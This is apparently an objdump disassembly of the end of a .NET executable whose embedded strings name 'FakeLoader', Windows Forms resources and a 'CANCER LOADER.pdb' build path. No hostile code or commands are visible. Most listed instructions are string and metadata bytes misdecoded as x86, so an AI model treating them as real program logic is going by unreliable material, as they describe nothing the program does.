  4063c6:	35 3e 64 5f 5f       	xor    $0x5f5f643e,%eax
  4063cb:	39 00                	cmp    %eax,(%eax)
  4063cd:	00 39                	add    %bh,(%ecx)
  4063cf:	01 00                	add    %eax,(%eax)
  4063d1:	34 46                	xor    $0x46,%al
  4063d3:	61                   	popa
  4063d4:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4063d8:	61                   	popa
  4063d9:	64 65 72 2e          	fs gs jb 0x40640b
  4063dd:	46                   	inc    %esi
  4063de:	6f                   	outsl  %ds:(%esi),(%dx)
  4063df:	72 6d                	jb     0x40644e
  4063e1:	31 2b                	xor    %ebp,(%ebx)
  4063e3:	3c 3e                	cmp    $0x3e,%al
  4063e5:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4063e8:	44                   	inc    %esp
  4063e9:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4063f0:	6c                   	insb   (%dx),%es:(%edi)
  4063f1:	61                   	popa
  4063f2:	73 73                	jae    0x406467
  4063f4:	33 5f 30             	xor    0x30(%edi),%ebx
  4063f7:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  4063fa:	52                   	push   %edx
  4063fb:	55                   	push   %ebp
  4063fc:	30 30                	xor    %dh,(%eax)
  4063fe:	32 3e                	xor    (%esi),%bh
  406400:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  406403:	30 3e                	xor    %bh,(%esi)
  406405:	64 00 00             	add    %al,%fs:(%eax)
  406408:	39 01                	cmp    %eax,(%ecx)
  40640a:	00 34 46             	add    %dh,(%esi,%eax,2)
  40640d:	61                   	popa
  40640e:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  406412:	61                   	popa
  406413:	64 65 72 2e          	fs gs jb 0x406445
  406417:	46                   	inc    %esi
  406418:	6f                   	outsl  %ds:(%esi),(%dx)
  406419:	72 6d                	jb     0x406488
  40641b:	31 2b                	xor    %ebp,(%ebx)
  40641d:	3c 3e                	cmp    $0x3e,%al
  40641f:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  406422:	44                   	inc    %esp
  406423:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40642a:	6c                   	insb   (%dx),%es:(%edi)
  40642b:	61                   	popa
  40642c:	73 73                	jae    0x4064a1
  40642e:	34 5f                	xor    $0x5f,%al
  406430:	30 2b                	xor    %ch,(%ebx)
  406432:	3c 3c                	cmp    $0x3c,%al
  406434:	55                   	push   %ebp
  406435:	53                   	push   %ebx
  406436:	30 30                	xor    %dh,(%eax)
  406438:	32 3e                	xor    (%esi),%bh
  40643a:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40643d:	30 3e                	xor    %bh,(%esi)
  40643f:	64 00 00             	add    %al,%fs:(%eax)
  406442:	40                   	inc    %eax
  406443:	01 00                	add    %eax,(%eax)
  406445:	33 53 79             	xor    0x79(%ebx),%edx
  406448:	73 74                	jae    0x4064be
  40644a:	65 6d                	gs insl (%dx),%es:(%edi)
  40644c:	2e 52                	cs push %edx
  40644e:	65 73 6f             	gs jae 0x4064c0
  406451:	75 72                	jne    0x4064c5
  406453:	63 65 73             	arpl   %esp,0x73(%ebp)
  406456:	2e 54                	cs push %esp
  406458:	6f                   	outsl  %ds:(%esi),(%dx)
  406459:	6f                   	outsl  %ds:(%esi),(%dx)
  40645a:	6c                   	insb   (%dx),%es:(%edi)
  40645b:	73 2e                	jae    0x40648b
  40645d:	53                   	push   %ebx
  40645e:	74 72                	je     0x4064d2
  406460:	6f                   	outsl  %ds:(%esi),(%dx)
  406461:	6e                   	outsb  %ds:(%esi),(%dx)
  406462:	67 6c                	insb   (%dx),%es:(%di)
  406464:	79 54                	jns    0x4064ba
  406466:	79 70                	jns    0x4064d8
  406468:	65 64 52             	gs fs push %edx
  40646b:	65 73 6f             	gs jae 0x4064dd
  40646e:	75 72                	jne    0x4064e2
  406470:	63 65 42             	arpl   %esp,0x42(%ebp)
  406473:	75 69                	jne    0x4064de
  406475:	6c                   	insb   (%dx),%es:(%edi)
  406476:	64 65 72 07          	fs gs jb 0x406481
  40647a:	34 2e                	xor    $0x2e,%al
  40647c:	30 2e                	xor    %ch,(%esi)
  40647e:	30 2e                	xor    %ch,(%esi)
  406480:	30 00                	xor    %al,(%eax)
  406482:	00 59 01             	add    %bl,0x1(%ecx)
  406485:	00 4b 4d             	add    %cl,0x4d(%ebx)
  406488:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40648f:	74 2e                	je     0x4064bf
  406491:	56                   	push   %esi
  406492:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  406499:	75 64                	jne    0x4064ff
  40649b:	69 6f 2e 45 64 69 74 	imul   $0x74696445,0x2e(%edi),%ebp
  4064a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4064a3:	72 73                	jb     0x406518
  4064a5:	2e 53                	cs push %ebx
  4064a7:	65 74 74             	gs je  0x40651e
  4064aa:	69 6e 67 73 44 65 73 	imul   $0x73654473,0x67(%esi),%ebp
  4064b1:	69 67 6e 65 72 2e 53 	imul   $0x532e7265,0x6e(%edi),%esp
  4064b8:	65 74 74             	gs je  0x40652f
  4064bb:	69 6e 67 73 53 69 6e 	imul   $0x6e695373,0x67(%esi),%ebp
  4064c2:	67 6c                	insb   (%dx),%es:(%di)
  4064c4:	65 46                	gs inc %esi
  4064c6:	69 6c 65 47 65 6e 65 	imul   $0x72656e65,0x47(%ebp,%eiz,2),%ebp
  4064cd:	72 
  4064ce:	61                   	popa
  4064cf:	74 6f                	je     0x406540
  4064d1:	72 08                	jb     0x4064db
  4064d3:	31 31                	xor    %esi,(%ecx)
  4064d5:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4064d8:	30 2e                	xor    %ch,(%esi)
  4064da:	30 00                	xor    %al,(%eax)
  4064dc:	00 00                	add    %al,(%eax)
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	b4 00                	mov    $0x0,%ah
  4064e2:	00 00                	add    %al,(%eax)
  4064e4:	ce                   	into
  4064e5:	ca ef be             	lret   $0xbeef
  4064e8:	01 00                	add    %eax,(%eax)
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	91                   	xchg   %eax,%ecx
  4064ed:	00 00                	add    %al,(%eax)
  4064ef:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  4064f3:	73 74                	jae    0x406569
  4064f5:	65 6d                	gs insl (%dx),%es:(%edi)
  4064f7:	2e 52                	cs push %edx
  4064f9:	65 73 6f             	gs jae 0x40656b
  4064fc:	75 72                	jne    0x406570
  4064fe:	63 65 73             	arpl   %esp,0x73(%ebp)
  406501:	2e 52                	cs push %edx
  406503:	65 73 6f             	gs jae 0x406575
  406506:	75 72                	jne    0x40657a
  406508:	63 65 52             	arpl   %esp,0x52(%ebp)
  40650b:	65 61                	gs popa
  40650d:	64 65 72 2c          	fs gs jb 0x40653d
  406511:	20 6d 73             	and    %ch,0x73(%ebp)
  406514:	63 6f 72             	arpl   %ebp,0x72(%edi)
  406517:	6c                   	insb   (%dx),%es:(%edi)
  406518:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  40651f:	73 69                	jae    0x40658a
  406521:	6f                   	outsl  %ds:(%esi),(%dx)
  406522:	6e                   	outsb  %ds:(%esi),(%dx)
  406523:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  406528:	30 2e                	xor    %ch,(%esi)
  40652a:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40652d:	43                   	inc    %ebx
  40652e:	75 6c                	jne    0x40659c
  406530:	74 75                	je     0x4065a7
  406532:	72 65                	jb     0x406599
  406534:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  406539:	72 61                	jb     0x40659c
  40653b:	6c                   	insb   (%dx),%es:(%edi)
  40653c:	2c 20                	sub    $0x20,%al
  40653e:	50                   	push   %eax
  40653f:	75 62                	jne    0x4065a3
  406541:	6c                   	insb   (%dx),%es:(%edi)
  406542:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  406549:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40654d:	62 37                	bound  %esi,(%edi)
  40654f:	37                   	aaa
  406550:	61                   	popa
  406551:	35 63 35 36 31       	xor    $0x31363563,%eax
  406556:	39 33                	cmp    %esi,(%ebx)
  406558:	34 65                	xor    $0x65,%al
  40655a:	30 38                	xor    %bh,(%eax)
  40655c:	39 23                	cmp    %esp,(%ebx)
  40655e:	53                   	push   %ebx
  40655f:	79 73                	jns    0x4065d4
  406561:	74 65                	je     0x4065c8
  406563:	6d                   	insl   (%dx),%es:(%edi)
  406564:	2e 52                	cs push %edx
  406566:	65 73 6f             	gs jae 0x4065d8
  406569:	75 72                	jne    0x4065dd
  40656b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40656e:	2e 52                	cs push %edx
  406570:	75 6e                	jne    0x4065e0
  406572:	74 69                	je     0x4065dd
  406574:	6d                   	insl   (%dx),%es:(%edi)
  406575:	65 52                	gs push %edx
  406577:	65 73 6f             	gs jae 0x4065e9
  40657a:	75 72                	jne    0x4065ee
  40657c:	63 65 53             	arpl   %esp,0x53(%ebp)
  40657f:	65 74 02             	gs je  0x406584
	...
  40658a:	00 00                	add    %al,(%eax)
  40658c:	00 50 41             	add    %dl,0x41(%eax)
  40658f:	44                   	inc    %esp
  406590:	50                   	push   %eax
  406591:	41                   	inc    %ecx
  406592:	44                   	inc    %esp
  406593:	50                   	push   %eax
  406594:	b4 00                	mov    $0x0,%ah
  406596:	00 00                	add    %al,(%eax)
  406598:	b4 00                	mov    $0x0,%ah
  40659a:	00 00                	add    %al,(%eax)
  40659c:	ce                   	into
  40659d:	ca ef be             	lret   $0xbeef
  4065a0:	01 00                	add    %eax,(%eax)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	91                   	xchg   %eax,%ecx
  4065a5:	00 00                	add    %al,(%eax)
  4065a7:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  4065ab:	73 74                	jae    0x406621
  4065ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4065af:	2e 52                	cs push %edx
  4065b1:	65 73 6f             	gs jae 0x406623
  4065b4:	75 72                	jne    0x406628
  4065b6:	63 65 73             	arpl   %esp,0x73(%ebp)
  4065b9:	2e 52                	cs push %edx
  4065bb:	65 73 6f             	gs jae 0x40662d
  4065be:	75 72                	jne    0x406632
  4065c0:	63 65 52             	arpl   %esp,0x52(%ebp)
  4065c3:	65 61                	gs popa
  4065c5:	64 65 72 2c          	fs gs jb 0x4065f5
  4065c9:	20 6d 73             	and    %ch,0x73(%ebp)
  4065cc:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4065cf:	6c                   	insb   (%dx),%es:(%edi)
  4065d0:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  4065d7:	73 69                	jae    0x406642
  4065d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4065da:	6e                   	outsb  %ds:(%esi),(%dx)
  4065db:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  4065e0:	30 2e                	xor    %ch,(%esi)
  4065e2:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  4065e5:	43                   	inc    %ebx
  4065e6:	75 6c                	jne    0x406654
  4065e8:	74 75                	je     0x40665f
  4065ea:	72 65                	jb     0x406651
  4065ec:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  4065f1:	72 61                	jb     0x406654
  4065f3:	6c                   	insb   (%dx),%es:(%edi)
  4065f4:	2c 20                	sub    $0x20,%al
  4065f6:	50                   	push   %eax
  4065f7:	75 62                	jne    0x40665b
  4065f9:	6c                   	insb   (%dx),%es:(%edi)
  4065fa:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  406601:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  406605:	62 37                	bound  %esi,(%edi)
  406607:	37                   	aaa
  406608:	61                   	popa
  406609:	35 63 35 36 31       	xor    $0x31363563,%eax
  40660e:	39 33                	cmp    %esi,(%ebx)
  406610:	34 65                	xor    $0x65,%al
  406612:	30 38                	xor    %bh,(%eax)
  406614:	39 23                	cmp    %esp,(%ebx)
  406616:	53                   	push   %ebx
  406617:	79 73                	jns    0x40668c
  406619:	74 65                	je     0x406680
  40661b:	6d                   	insl   (%dx),%es:(%edi)
  40661c:	2e 52                	cs push %edx
  40661e:	65 73 6f             	gs jae 0x406690
  406621:	75 72                	jne    0x406695
  406623:	63 65 73             	arpl   %esp,0x73(%ebp)
  406626:	2e 52                	cs push %edx
  406628:	75 6e                	jne    0x406698
  40662a:	74 69                	je     0x406695
  40662c:	6d                   	insl   (%dx),%es:(%edi)
  40662d:	65 52                	gs push %edx
  40662f:	65 73 6f             	gs jae 0x4066a1
  406632:	75 72                	jne    0x4066a6
  406634:	63 65 53             	arpl   %esp,0x53(%ebp)
  406637:	65 74 02             	gs je  0x40663c
	...
  406642:	00 00                	add    %al,(%eax)
  406644:	00 50 41             	add    %dl,0x41(%eax)
  406647:	44                   	inc    %esp
  406648:	50                   	push   %eax
  406649:	41                   	inc    %ecx
  40664a:	44                   	inc    %esp
  40664b:	50                   	push   %eax
  40664c:	b4 00                	mov    $0x0,%ah
  40664e:	00 00                	add    %al,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	15 f8 bb b8 00       	adc    $0xb8bbf8,%eax
  406659:	00 00                	add    %al,(%eax)
  40665b:	00 02                	add    %al,(%edx)
  40665d:	00 00                	add    %al,(%eax)
  40665f:	00 78 00             	add    %bh,0x0(%eax)
  406662:	00 00                	add    %al,(%eax)
  406664:	88 66 00             	mov    %ah,0x0(%esi)
  406667:	00 88 48 00 00 00    	add    %cl,0x48(%eax)
	...
  406675:	00 00                	add    %al,(%eax)
  406677:	00 10                	add    %dl,(%eax)
	...
  406685:	00 00                	add    %al,(%eax)
  406687:	00 52 53             	add    %dl,0x53(%edx)
  40668a:	44                   	inc    %esp
  40668b:	53                   	push   %ebx
  40668c:	be f0 70 20 1e       	mov    $0x1e2070f0,%esi
  406691:	c4                   	(bad)
  406692:	df 43 82             	filds  -0x7e(%ebx)
  406695:	ef                   	out    %eax,(%dx)
  406696:	5a                   	pop    %edx
  406697:	6b aa 29 3c a4 01 00 	imul   $0x0,0x1a43c29(%edx),%ebp
  40669e:	00 00                	add    %al,(%eax)
  4066a0:	43                   	inc    %ebx
  4066a1:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  4066a5:	65 72 73             	gs jb  0x40671b
  4066a8:	5c                   	pop    %esp
  4066a9:	4d                   	dec    %ebp
  4066aa:	61                   	popa
  4066ab:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4066ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4066af:	7a 69                	jp     0x40671a
  4066b1:	65 5c                	gs pop %esp
  4066b3:	73 6f                	jae    0x406724
  4066b5:	75 72                	jne    0x406729
  4066b7:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  4066ba:	72 65                	jb     0x406721
  4066bc:	70 6f                	jo     0x40672d
  4066be:	73 5c                	jae    0x40671c
  4066c0:	57                   	push   %edi
  4066c1:	69 6e 64 6f 77 73 46 	imul   $0x4673776f,0x64(%esi),%ebp
  4066c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c9:	72 6d                	jb     0x406738
  4066cb:	73 41                	jae    0x40670e
  4066cd:	70 70                	jo     0x40673f
  4066cf:	31 5c 57 69          	xor    %ebx,0x69(%edi,%edx,2)
  4066d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4066d4:	64 6f                	outsl  %fs:(%esi),(%dx)
  4066d6:	77 73                	ja     0x40674b
  4066d8:	46                   	inc    %esi
  4066d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4066da:	72 6d                	jb     0x406749
  4066dc:	73 41                	jae    0x40671f
  4066de:	70 70                	jo     0x406750
  4066e0:	31 5c 6f 62          	xor    %ebx,0x62(%edi,%ebp,2)
  4066e4:	6a 5c                	push   $0x5c
  4066e6:	52                   	push   %edx
  4066e7:	65 6c                	gs insb (%dx),%es:(%edi)
  4066e9:	65 61                	gs popa
  4066eb:	73 65                	jae    0x406752
  4066ed:	5c                   	pop    %esp
  4066ee:	43                   	inc    %ebx
  4066ef:	41                   	inc    %ecx
  4066f0:	4e                   	dec    %esi
  4066f1:	43                   	inc    %ebx
  4066f2:	45                   	inc    %ebp
  4066f3:	52                   	push   %edx
  4066f4:	20 4c 4f 41          	and    %cl,0x41(%edi,%ecx,2)
  4066f8:	44                   	inc    %esp
  4066f9:	45                   	inc    %ebp
  4066fa:	52                   	push   %edx
  4066fb:	2e 70 64             	jo,pn  0x406762
  4066fe:	62 00                	bound  %eax,(%eax)
  406700:	28 67 00             	sub    %ah,0x0(%edi)
	...
  40670b:	00 42 67             	add    %al,0x67(%edx)
  40670e:	00 00                	add    %al,(%eax)
  406710:	00 20                	add    %ah,(%eax)
	...
  406726:	00 00                	add    %al,(%eax)
  406728:	34 67                	xor    $0x67,%al
	...
  406736:	5f                   	pop    %edi
  406737:	43                   	inc    %ebx
  406738:	6f                   	outsl  %ds:(%esi),(%dx)
  406739:	72 45                	jb     0x406780
  40673b:	78 65                	js     0x4067a2
  40673d:	4d                   	dec    %ebp
  40673e:	61                   	popa
  40673f:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  406746:	72 65                	jb     0x4067ad
  406748:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40674c:	6c                   	insb   (%dx),%es:(%edi)
  40674d:	00 00                	add    %al,(%eax)
  40674f:	00 00                	add    %al,(%eax)
  406751:	00 ff                	add    %bh,%bh
  406753:	25 00 20 40 00       	and    $0x402000,%eax
